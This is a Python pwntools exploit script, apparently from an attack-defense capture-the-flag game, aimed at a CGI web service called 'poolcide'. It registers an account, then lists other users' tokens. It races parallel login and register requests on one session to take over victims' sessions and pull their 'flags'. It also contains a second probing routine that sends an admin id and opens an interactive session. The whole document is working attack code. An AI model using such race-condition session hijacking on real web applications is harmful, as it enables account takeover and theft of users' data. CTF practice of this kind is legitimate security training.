#!/usr/bin/env python3
import html
import urllib.parse

from pwn import *

PORT = 9001


def get_cookie_and_csrf(ip, cookie=None):
    tube = remote(ip, PORT)
    try:
        tube.send(f'GET /cgi-bin/poolcide?route=index HTTP/1.1\r\n')
        if cookie is not None:
            tube.send(f'Cookie: poolcode={cookie}\r\n')
        tube.send('\r\n')
        response = tube.recvall()
        m = re.search(
            br'Set-Cookie: poolcode=([^;]+); HttpOnly',
            response,
        )
        assert m is not None
        cookie, = m.groups()
        m = re.search(
            br'<input type="hidden" id="csrf" name="csrf" value="([^\"]+)" />',
            response,
        )
        assert m is not None
        csrf, = m.groups()
        return cookie.decode(), csrf.decode()
    finally:
        tube.close()


def random_word(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))


def register(ip, cookie, csrf):
    username = random_word(8)
    password = random_word(8)
    tube = remote(ip, PORT)
    try:
        tube.send('POST /cgi-bin/poolcide?route=register HTTP/1.1\r\n')
        tube.send(f'Cookie: poolcode={cookie}\r\n')
        tube.send('\r\n')
        tube.send(f'username={username}&password={password}&csrf={csrf}\n')
        response = tube.recvall()
        assert response.endswith(b'\r\n\r\nsuccess')
        return username, password
    finally:
        tube.close()


def list(ip, cookie):
    tube = remote(ip, PORT)
    try:
        tube.send('GET /cgi-bin/poolcide?route=dispense HTTP/1.1\r\n')
        tube.send(f'Cookie: poolcode={cookie}\r\n')
        tube.send('\r\n')
        response = tube.recvall()
        for token, user in re.findall(
                br'<strong>([^<]+)</strong> // ([^<]+)',
                response,
        ):
            yield token.decode(), user.decode()
    finally:
        tube.close()


def bar(ip, cookie, csrf):
    tube = remote(ip, PORT)
    try:
        tube.send('POST /cgi-bin/poolcide?route=reserve HTTP/1.1\r\n')
        tube.send(f'Cookie: poolcode={cookie}\r\n')
        tube.send('\r\n')
        tube.send(f'csrf={csrf}\n')
        tube.send(f'color=black\n')
        prefix = '-----BEGIN AGE ENCRYPTED FILE-----'
        suffix = '-----END AGE ENCRYPTED FILE-----'
        tube.recvuntil(prefix)
        encfile = tube.recvuntil(suffix)[:-len(suffix)]
        print(encfile)
        tube.send(f'towel_admin_id=999\n')
        tube.interactive()
    finally:
        tube.close()


def fetch(ip, cookie, token):
    tube = remote(ip, PORT)
    try:
        tube.send(f'GET /cgi-bin/poolcide?route=towel&token={token} HTTP/1.1\r\n')
        tube.send(f'Cookie: poolcode={cookie}\r\n')
        tube.send('\r\n')
        response = tube.recvall()
        return response
    finally:
        tube.close()


def main():
    ip, = sys.argv[1:]
    cookie, csrf = get_cookie_and_csrf(ip)
    username, password = register(ip, cookie, csrf)
    for victim_token, victim_username in list(ip, cookie):
        for i in range(15):
            cookie, csrf = get_cookie_and_csrf(ip, cookie)
            tube1 = remote(ip, PORT)
            tube2 = remote(ip, PORT)
            try:
                if i % 2 == 0:
                    racy_route = 'register'
                else:
                    racy_route = 'login'
                tube1.send(f'POST /cgi-bin/poolcide?route=login HTTP/1.1\r\n')
                tube1.send(f'Cookie: poolcode={cookie}\r\n')
                tube1.send('\r\n')
                tube2.send(f'POST /cgi-bin/poolcide?route={racy_route} HTTP/1.1\r\n')
                tube2.send(f'Cookie: poolcode={cookie}\r\n')
                tube2.send('\r\n')

                time.sleep(0.1)
                tube1.send(f'csrf={csrf}\r\n')
                tube2.send(f'csrf={csrf}\r\n')

                time.sleep(0.1)
                tube1.send(f'username={username}\r\n')

                time.sleep(0.1)
                tube2.send(f'username={victim_username}\r\n')

                time.sleep(0.1)
                tube1.send(f'password={password}\r\n')
                tube1.recvall()
                tube1.close()

                flag = fetch(ip, cookie, victim_token)
                if b'This towel belongs to you' in flag:
                    m = re.search(br'<code class="indubitably marvellous" id="color">([^<]+)', flag)
                    assert m is not None
                    flag, = m.groups()
                    flag = flag.decode()
                    flag = html.unescape(flag)
                    flag = urllib.parse.unquote(flag)
                    print(f'FLAG: {flag}')
                    break
            except:
                continue
            finally:
                tube1.close()
                tube2.close()


if __name__ == '__main__':
    main()
